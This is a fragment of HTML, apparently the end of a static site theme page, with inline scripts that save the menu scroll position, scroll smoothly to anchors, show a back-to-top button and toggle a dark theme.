+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
